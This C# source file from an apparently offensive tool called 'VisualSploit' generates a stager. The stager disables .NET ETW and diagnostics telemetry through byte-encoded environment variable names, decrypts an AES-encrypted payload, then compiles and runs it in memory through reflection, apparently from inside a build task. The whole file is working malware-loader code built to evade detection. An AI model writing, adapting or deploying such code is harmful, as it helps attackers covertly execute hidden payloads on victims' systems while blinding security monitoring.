using VisualSploit.Core;
using VisualSploit.Crypto;

namespace VisualSploit.Templates;

internal static class Stager
{
    public static string Generate(AesResult aes)
    {
        return $$"""
                      var e1 = System.Text.Encoding.UTF8.GetString(new byte[]{67,79,77,80,108,117,115,95,69,110,97,98,108,101,68,105,97,103,110,111,115,116,105,99,115});
                      var e2 = System.Text.Encoding.UTF8.GetString(new byte[]{67,79,77,80,108,117,115,95,69,84,87,69,110,97,98,108,101,100});
                      System.Environment.SetEnvironmentVariable(e1, "0");
                      System.Environment.SetEnvironmentVariable(e2, "0");

                      var content = "{{aes.Data}}";
                      var vector = new byte[] { {{Utils.Hex(aes.Iv)}} };
                      var seed = new byte[] { {{Utils.Hex(aes.Salt)}} };
                      var token = new byte[] { {{Utils.Hex(aes.Key)}} };

                      byte[] derived;
                      using (var kdf = new System.Security.Cryptography.Rfc2898DeriveBytes(token, seed, 100000))
                      {
                          derived = kdf.GetBytes(32);
                      }

                      var raw = System.Convert.FromBase64String(content);
                      string source;
                      using (var cipher = System.Security.Cryptography.Aes.Create())
                      {
                          cipher.KeySize = 256;
                          cipher.Key = derived;
                          cipher.IV = vector;
                          cipher.Mode = System.Security.Cryptography.CipherMode.CBC;
                          cipher.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                          using (var transform = cipher.CreateDecryptor())
                          using (var ms = new System.IO.MemoryStream(raw))
                          using (var cs = new System.Security.Cryptography.CryptoStream(ms, transform, System.Security.Cryptography.CryptoStreamMode.Read))
                          using (var reader = new System.IO.StreamReader(cs))
                              source = reader.ReadToEnd();
                      }

                      var provTypeName = System.Text.Encoding.UTF8.GetString(new byte[]{{{Utils.Bytes("Microsoft.CSharp.CSharpCodeProvider, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")}}});
                      var provType = System.Type.GetType(provTypeName);
                      var provider = System.Activator.CreateInstance(provType);
                      try
                      {
                          var paramTypeName = System.Text.Encoding.UTF8.GetString(new byte[]{{{Utils.Bytes("System.CodeDom.Compiler.CompilerParameters, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")}}});
                          var paramType = System.Type.GetType(paramTypeName);
                          var parameters = System.Activator.CreateInstance(paramType);
                          paramType.GetProperty("GenerateInMemory").SetValue(parameters, true);
                          var refs = paramType.GetProperty("ReferencedAssemblies").GetValue(parameters);
                          var addRef = refs.GetType().GetMethod("Add", new[] { typeof(string) });
                          addRef.Invoke(refs, new object[] { "System.dll" });
                          addRef.Invoke(refs, new object[] { "System.Core.dll" });
                          var compile = provType.GetMethod("CompileAssemblyFromSource");
                          var output = compile.Invoke(provider, new object[] { parameters, new string[] { source } });
                          var assembly = (System.Reflection.Assembly)output.GetType().GetProperty("CompiledAssembly").GetValue(output);
                          assembly.GetType("BuildTask").GetMethod("Run", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Public)?.Invoke(null, null);
                      }
                      finally
                      {
                          ((System.IDisposable)provider).Dispose();
                      }
                      """;
    }
}
